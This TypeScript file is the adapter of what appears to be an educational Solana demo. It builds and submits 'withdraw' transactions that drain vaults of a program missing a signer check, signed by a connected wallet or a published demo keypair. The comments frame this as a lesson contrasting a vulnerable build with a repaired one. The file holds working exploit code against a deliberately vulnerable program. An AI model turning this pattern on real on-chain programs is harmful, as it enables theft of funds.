/**
 * solanaChain.ts — where web3.js and Phantom actually meet.
 *
 * Everything decision-shaped lives in `chainRun.ts` and `devnet.ts`; this file
 * is the adapter that turns them into real bytes, so it stays as small as it
 * can. It is still tested — the test signs with a real keypair, lets web3.js
 * serialize, and deserializes the result to check the instruction against the
 * program's source. Pinning what web3.js does with our encoding is worth more
 * than pinning the encoding twice.
 */

import { Buffer } from 'buffer';
import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
import type { AttackPorts } from './chainRun';
import { withdrawAccounts, withdrawInstructionData, type VaultReader } from './devnet';
import type { SolanaProvider } from './wallet';
import { demoSigner } from '../config/demoSigner';

/** Only the three RPC calls the attack needs; a real `Connection` satisfies it. */
export type AttackConnection = Pick<
  Connection,
  'getLatestBlockhash' | 'sendRawTransaction' | 'getSignatureStatuses'
>;

/** Only the one call reading vaults needs. */
export type AccountConnection = Pick<Connection, 'getMultipleAccountsInfo'>;

/**
 * The one instruction both ports send.
 *
 * Kept here so the wallet path and the demo-key path cannot drift apart: a
 * second copy of the account list or of the amount encoding is exactly where the
 * two would quietly disagree about what the attack *is*.
 */
function withdrawInstruction(
  programId: PublicKey,
  input: { vault: string; authority: string; amount: number },
): TransactionInstruction {
  return new TransactionInstruction({
    programId,
    keys: withdrawAccounts(new PublicKey(input.vault), new PublicKey(input.authority)),
    // web3.js types this field as `buffer`'s `Buffer` — a nominal class with 66
    // methods a plain `Uint8Array` does not have. The conversion belongs here
    // rather than in `devnet.ts`, which stays free of the `buffer` dependency
    // and therefore of any need for a polyfill.
    data: Buffer.from(withdrawInstructionData(input.amount)),
  });
}

/** A recent blockhash for the transaction message. Shared by both ports. */
function latestBlockhashPort(connection: AttackConnection): AttackPorts['latestBlockhash'] {
  return async () => {
    const { blockhash } = await connection.getLatestBlockhash();
    return blockhash;
  };
}

/**
 * The RPC status of a submitted signature, mapped to what `chainRun.ts` expects.
 * Shared by both ports — pending stays pending, and only a settled status is a
 * verdict.
 */
function signatureStatusPort(connection: AttackConnection): AttackPorts['signatureStatus'] {
  return async (signature) => {
    const { value } = await connection.getSignatureStatuses([signature]);
    const status = value?.[0];
    if (!status) return null;

    // A status the cluster has seen but not yet confirmed is still pending;
    // reporting it as a verdict would turn a race into a result.
    const settled =
      status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized';
    return settled ? { err: status.err ?? null } : null;
  };
}

/**
 * The program id is a parameter rather than a module import so the adapter never
 * has to know where configuration lives — and so a test can point it at a
 * throwaway id.
 */
export function attackPorts(
  connection: AttackConnection,
  provider: SolanaProvider,
  programId: PublicKey,
): AttackPorts {
  const feePayer = (): PublicKey => {
    const key = provider.publicKey;
    if (!key) throw new Error('wallet is not connected');
    return new PublicKey(key.toBase58());
  };

  return {
    latestBlockhash: latestBlockhashPort(connection),

    sendWithdraw: async (input) => {
      const transaction = new Transaction({
        feePayer: feePayer(),
        recentBlockhash: input.blockhash,
      });

      transaction.add(withdrawInstruction(programId, input));

      const signed = await provider.signTransaction(transaction);

      // skipPreflight is load-bearing, not a shortcut. With preflight on, the
      // repaired build's transaction is rejected by simulation and never lands,
      // so there is no signature to point at — and "the runtime refused it,
      // here is the failed transaction" is the entire evidence for that half of
      // the lesson.
      return connection.sendRawTransaction(signed.serialize(), { skipPreflight: true });
    },

    signatureStatus: signatureStatusPort(connection),
  };
}

/**
 * The demo-key attack port — the same transaction, signed here instead of by a
 * wallet.
 *
 * This is what makes Execute real for a visitor with no wallet: the published
 * demo keypair (`config/demoSigner.ts`) is the fee payer and the only signer, and
 * the transaction goes straight to the RPC. The `authority` account is still the
 * ADMIN public key — nobody signs as the admin, which is the whole point of the
 * lesson: `withdraw` declares no signer, so a transaction that never held the
 * admin's secret still drains the vault.
 *
 * Identical to `attackPorts` in every other respect — same instruction, same
 * `skipPreflight` reasoning, same status mapping. The only difference is who
 * holds the signature.
 */
export function demoAttackPorts(
  connection: AttackConnection,
  programId: PublicKey,
  signer: Keypair = demoSigner(),
): AttackPorts {
  return {
    latestBlockhash: latestBlockhashPort(connection),

    sendWithdraw: async (input) => {
      const transaction = new Transaction({
        feePayer: signer.publicKey,
        recentBlockhash: input.blockhash,
      });

      transaction.add(withdrawInstruction(programId, input));
      transaction.sign(signer);

      // Same reasoning as `attackPorts`: with preflight on, the repaired build's
      // transaction is rejected by simulation and never lands, so there is no
      // signature to point at — and the failed transaction is the evidence.
      return connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true });
    },

    signatureStatus: signatureStatusPort(connection),
  };
}

/**
 * Read pool vaults' raw account data, one result per address in order — null
 * for an account that is not there, or is not owned by the program being
 * attacked.
 *
 * Batched through `getMultipleAccountsInfo`, which is the whole point of the
 * seam: the scan walks past the drained vaults at the front of the pool, and
 * asking one at a time cost a round trip per vault. One call answers a whole
 * batch.
 *
 * The owner check is the demo's own lesson turned on itself: an account's data
 * is not its identity, its owner is. The fixed build's vault now sits at an
 * index the pool scan can reach, and its bytes are indistinguishable from a
 * pool vault's — same discriminator, same authority, same balance — so if the
 * reader went by data alone the vulnerable program would be handed a
 * fixed-owned account and refused for the account-owner reason, which proves
 * nothing about the missing signer. Only `owner` separates them, so a
 * fixed-owned vault must come back null and never become a candidate.
 */
export function createVaultReader(
  connection: AccountConnection,
  programId: PublicKey,
): VaultReader {
  return async (addresses: PublicKey[]) => {
    if (addresses.length === 0) return [];
    const infos = await connection.getMultipleAccountsInfo(addresses);
    return infos.map((info) => {
      if (!info) return null;
      if (!info.owner.equals(programId)) return null;
      return toBytes(info.data);
    });
  };
}

/**
 * Accept both shapes a node's account data arrives in.
 *
 * web3.js hands back a `Buffer` (already a `Uint8Array`, so it needs no
 * polyfill from us) but a JSON-RPC response decoded by hand is `[base64, encoding]`.
 * Base64 is decoded through `atob` rather than `Buffer.from` precisely so this
 * module keeps working in a browser where `Buffer` only exists if we shim it.
 */
function toBytes(data: unknown): Uint8Array {
  if (data instanceof Uint8Array) return data;

  if (Array.isArray(data)) {
    const [encoded, encoding] = data as [string, string];
    if (encoding === 'base64') return base64ToBytes(encoded);
    throw new Error(`unsupported account encoding: ${encoding}`);
  }

  throw new Error('unsupported account data shape');
}

function base64ToBytes(value: string): Uint8Array {
  const binary = atob(value);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
  return bytes;
}
